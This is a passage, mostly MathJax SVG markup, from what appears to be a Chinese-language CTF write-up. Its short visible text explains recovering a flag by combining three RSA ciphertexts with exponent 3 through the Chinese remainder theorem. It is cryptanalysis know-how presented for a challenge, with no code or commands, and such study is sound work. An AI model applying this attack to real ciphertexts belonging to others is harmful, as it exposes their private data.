464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2962.4,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(3999,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4443.7,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mn" transform="translate(466,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(5313.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5757.9,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mn" transform="translate(466,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6627.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(7072.1,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mn" transform="translate(466,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container>. 我們有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="21.824ex" height="2.242ex" role="img" focusable="false" viewBox="0 -833.2 9646.3 991"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(466,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1037.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2093.5,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mi" transform="translate(2842.5,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(3523.5,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="msup" transform="translate(4273.5,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mspace" transform="translate(5496.1,0)"></g><g data-mml-node="mi" transform="translate(6329.7,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(8218.7,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(8385.7,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="msub" transform="translate(8719.4,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>, 透過 crt 可以組回原本的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.974ex" height="1.91ex" role="img" focusable="false" viewBox="0 -833.2 1314.6 844.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(911,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container>, 要三個才能組回原因是因為 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="11.714ex" height="1.805ex" role="img" focusable="false" viewBox="0 -716 5177.6 798"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1155.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2211.6,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mi" transform="translate(2960.6,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(3641.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(4391.6,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g></svg></mjx-container> 最多只能有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="4.525ex" height="1.581ex" role="img" focusable="false" viewBox="0 -677 2000 699"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)"></path></g></g></g></svg></mjx-container> bits (因為 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex;" xmlns="http://www.w3.org/2000/svg" width="6.361ex" height="1.312ex" role="img" focusable="false" viewBox="0 -540 2811.6 580"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1155.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(2211.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>), 所以 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.974ex" height="1.91ex" role="img" focusable="false" viewBox="0 -833.2 1314.6 844.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 